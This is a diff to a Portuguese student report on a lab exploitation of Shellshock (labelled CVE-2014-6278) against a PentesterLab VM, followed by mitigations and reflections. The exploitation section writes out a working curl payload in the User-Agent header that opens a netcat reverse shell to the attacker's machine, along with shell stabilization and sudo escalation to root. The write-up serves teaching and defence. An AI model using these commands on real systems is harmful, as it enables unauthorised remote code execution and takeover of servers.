@@ -255,44 +255,115 @@ if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
 }
 ```
 
-## Vulnerabilidade 2: [A Definir]
+## Vulnerabilidade 2: GNU Bash OS Command Injection Vulnerability - CVE-2014-6278
 
 ### Apresentação da Vulnerabilidade
 
 **Identificação:**
-- **CVE ID**: [A completar]
-- **Sistema/Aplicação Afetada**: [A completar]
-- **Versões Vulneráveis**: [A completar]
-- **Tipo de Vulnerabilidade**: [A completar]
-- **Severidade**: [A completar]
+- **CVE ID**: CVE-2014-6278
+- **Sistema/Aplicação Afetada**: GNU Bash (Bourne Again SHell)
+- **Versões Vulneráveis**: Versões do Bash até à 4.3
+- **Tipo de Vulnerabilidade**: Injeção de Comandos / Execução Remota de Código (RCE)
+- **Severidade**: Crítica (CVSS v2: 10.0 / CVSS v3: 9.8)
 
 **Sistemas Afetados:**
 
-[Descrição dos sistemas afetados - A completar]
+A vulnerabilidade afeta sistemas operativos baseados em Unix/Linux (como Debian, Ubuntu, CentOS, RedHat) e macOS que utilizam o Bash como interpretador de comandos padrão. No contexto deste trabalho, o sistema afetado foi a VM Pentester Lab (Debian Wheezy 32-bit) a correr um servidor web Apache configurado para executar scripts CGI (/cgi-bin/status).
 
 **Ações e Objetivos:**
 
-[Descrição das ações possíveis e objetivos do atacante - A completar]
+O objetivo do atacante é explorar o processamento incorreto de variáveis de ambiente pelo Bash. Ao injetar código malicioso, o atacante pretende:
+
+1. Executar comandos arbitrários no servidor remoto sem autenticação.
+
+2. Obter acesso inicial ao sistema (Shell).
+
+3. Estabelecer uma conexão reversa (Reverse Shell).
+
+4. Escalar privilégios para obter controlo total (Root).
 
 **Resultados de Exploração:**
 
-[Descrição dos resultados quando a vulnerabilidade é explorada - A completar]
+Quando explorada com sucesso, a vulnerabilidade permite ao atacante executar qualquer comando com os privilégios do utilizador que corre o serviço (neste caso pentesterlab). Isto resulta no compromisso total da confidencialidade, integridade e disponibilidade do sistema, permitindo a leitura de ficheiros sensíveis (/etc/shadow), modificação de dados ou instalação de backdoors.
 
 ### Exploração da Vulnerabilidade
 
 **Como Atua a Vulnerabilidade:**
 
-[Explicação detalhada do funcionamento - A completar]
+O "Shellshock" explora uma falha na forma como o Bash processa definições de funções passadas através de variáveis de ambiente. O Bash permite exportar funções, mas, nas versões vulneráveis, ele continuava a processar e executar código que fosse colocado após o fecho da definição da função. A assinatura do ataque é () { :; };, seguida do comando malicioso. Num servidor web com CGI, cabeçalhos HTTP como o User-Agent são convertidos em variáveis de ambiente, permitindo a injeção direta.
 
 **Como Explorar a Vulnerabilidade:**
 
-[Passos detalhados de exploração - A completar]
+1. Reconhecimento (Descoberta do Alvo): Identificação do IP da vítima na rede local utilizando varrimento de rede.
+
+```php
+sudo nmap -sn 10.0.2.0/24
+```  
+
+![image info](./imagens_bash/ip_vitima(2).png)
+
+2. Verificação (Reconnaissance): Confirmação de que o script CGI existe e está acessível.
+
+```php
+curl -I http://10.0.2.4/cgi-bin/status
+```
+***-I*** → Head request
+
+
+![image info](./imagens_bash/verificar_porta_aberta(3).png)
+
+3. Exploração e Acesso Inicial (Reverse Shell): Injeção do payload malicioso no cabeçalho User-Agent para forçar o servidor a conectar-se ao atacante (Kali) via Netcat.
+
+No Atacante (Listener):
+```php
+nc -lvnp 4444
+```
+***-l*** → listen
+
+***-v*** → verbose (mostrar mais detalhes)
+
+***-n*** → não fazer DNS lookup (usar só números IP)
+
+***-p*** 4444 → porta TCP em que o NetCat onde vai ouvir  
+
+![image info](./imagens_bash/escuta(reserve_shell_handler)_(4).png)
+
+Disparo do Exploit:
+
+```php
+curl -H "User-Agent: () { :; }; echo; /usr/bin/nc 10.0.2.200 4444 -e /bin/bash" http://10.0.2.4/cgi-bin/status
+```
+***-e /bin/bash*** → Anexa um shell ao NetCat (reverse shell)
+
+![image info](./imagens_bash/connect_vitima(5).png)
+![image info](./imagens_bash/connect_pentester(7).png)
+![image info](./imagens_bash/whoami(8).png)
+
+4. Estabilização e Escalada de Privilégios: Após obter a shell como utilizador pentesterlab, a shell foi estabilizada e os privilégios foram elevados para root explorando permissões de sudo ou vulnerabilidades de Kernel.
+
+```php
+python -c 'import pty; pty.spawn("/bin/bash")'
+sudo -s
+# (Ou via Kernel Exploit Dirty COW se necessário)
+```
+![image info](./imagens_bash/root.png)
+
 
 ### Mitigação da Vulnerabilidade
 
 **Medidas de Proteção:**
 
-[Medidas de mitigação e proteção - A completar]
+1. Atualização do Bash (Patching): A medida mais eficaz é atualizar o GNU Bash para a versão mais recente que contém a correção para o CVE-2014-6278 e variantes subsequentes.
+
+```php
+sudo apt-get update && sudo apt-get install --only-upgrade bash
+```
+
+2. Configuração de WAF (Web Application Firewall): Implementar regras no WAF (como ModSecurity) para filtrar e bloquear pedidos HTTP que contenham a assinatura do exploit: () { :; };.
+
+3. Desativação de CGI: Se não for estritamente necessário, desativar o suporte a scripts CGI no servidor web para reduzir a superfície de ataque.
+
+4. Princípio do Menor Privilégio: Garantir que o utilizador do serviço web (pentesterlab) não tem permissões de sudo desnecessárias e não tem acesso de escrita em diretórios sensíveis.
 
 ---
 
@@ -332,6 +403,39 @@ Este trabalho permitiu aplicar na prática os conceitos teóricos sobre vulnerab
 
 6. **Impacto nos Utilizadores Finais**: XSS tem consequências reais - roubo de identidade, perda de dados, comprometimento de contas. Como profissionais de cibersegurança, temos responsabilidade em proteger os utilizadores.
 
+---
+
+### Enquadramento com a Aprendizagem da UC
+
+Este trabalho permitiu aplicar na prática os conceitos teóricos sobre vulnerabilidades de infraestrutura e execução remota de código (RCE), nomeadamente:
+
+**Conhecimentos Aplicados sobre Shellshock e RCE:**
+
+1. **Compreensão da Execução Remota:** Analisámos como o Shellshock (CVE-2014-6278) explora o processamento incorreto de variáveis de ambiente pelo Bash, permitindo a injeção de comandos arbitrários através de vetores HTTP (como o cabeçalho User-Agent).
+
+2. **Interação Web-Sistema Operativo:** Compreendemos na prática como scripts CGI (Common Gateway Interface) atuam como ponte entre um pedido web e a shell do sistema operativo, criando a superfície de ataque necessária.
+
+3. **Metodologias de Teste e Exploração:** Aplicámos um ciclo completo de Penetration Testing, incluindo:
+
+***Reconhecimento de Rede:*** Utilização de ferramentas como nmap e netdiscover para identificar hosts ativos e portas abertas num ambiente de caixa negra (Black Box).
+
+***Exploração Manual:*** Manipulação de cabeçalhos HTTP com o curl para injetar payloads maliciosos (() { :; };) sem depender de ferramentas automáticas.
+
+***Reverse Shells***: Estabelecimento de persistência e controlo remoto utilizando netcat (nc), compreendendo a diferença entre bind shells e reverse shells.
+
+***Pós-Exploração:*** Técnicas de estabilização de shell com Python e métodos de escalada de privilégios, tanto por má configuração (sudo) como por exploração de Kernel (Dirty COW).
+
+**O Que Depreendemos das Vulnerabilidades**
+
+Lições Principais:
+
+1. **O Perigo de Componentes Legacy:** A vulnerabilidade explorada reside num componente fundamental do sistema operativo (Bash) e não na aplicação web em si. Isto demonstra que mesmo um código web seguro pode ser comprometido se a infraestrutura subjacente estiver desatualizada.
+
+2. **Validação de Input é Universal:** Tal como no XSS, o Shellshock ocorre porque o sistema confia cegamente na entrada externa (variáveis de ambiente). A sanitização deve ocorrer em todas as camadas, não apenas no browser.
+
+3. **Escalada de Privilégios é Crítica:** O acesso inicial como pentesterlab é limitado. A verdadeira severidade do ataque revelou-se na fase de pós-exploração, onde demonstrámos que uma má configuração de sudo ou um Kernel antigo (Dirty COW) permitem a um atacante assumir o controlo total (root) da máquina.
+
+
 ### Reflexão Final
 
 A análise destas vulnerabilidades reforçou a importância de uma abordagem proativa à segurança. Não basta corrigir vulnerabilidades após serem descobertas - é necessário incorporar segurança desde o design (Security by Design) e realizar auditorias regulares.
@@ -339,6 +443,14 @@ A análise destas vulnerabilidades reforçou a importância de uma abordagem pro
 O estudo do CVE-2021-42548 demonstrou como vulnerabilidades em componentes de terceiros (plugins WordPress) podem afetar drasticamente a segurança de toda a aplicação. Isto sublinha a necessidade de due diligence ao escolher dependências externas e de manter um inventário atualizado de todos os componentes utilizados.
 
 Finalmente, este trabalho evidenciou que cibersegurança é um campo em constante evolução, requerendo aprendizagem contínua e adaptação a novas ameaças e técnicas de ataque.
+
+---
+
+A análise do CVE-2014-6278 reforçou a importância crucial da Gestão de Patches e da manutenção de sistemas. Ao contrário de vulnerabilidades de aplicação que afetam um site específico, o Shellshock afetou milhões de servidores globais devido à omnipresença do Bash.
+
+Este trabalho evidenciou a diferença entre segurança de aplicação e segurança de infraestrutura. Enquanto o XSS compromete o utilizador, o Shellshock compromete o servidor inteiro. O estudo prático da escalada de privilégios (passando de um utilizador de serviço para Root) demonstrou o conceito de "Kill Chain": um atacante raramente para na primeira porta que abre; o objetivo é sempre a persistência e o controlo administrativo máximo.
+
+Finalmente, concluímos que a segurança ofensiva requer adaptabilidade. Quando o brute-force falha, tenta-se um exploit de Kernel; quando a compilação falha, procura-se por configurações incorretas. Esta mentalidade de resolução de problemas é a base da cibersegurança profissional.
 
 ---
 
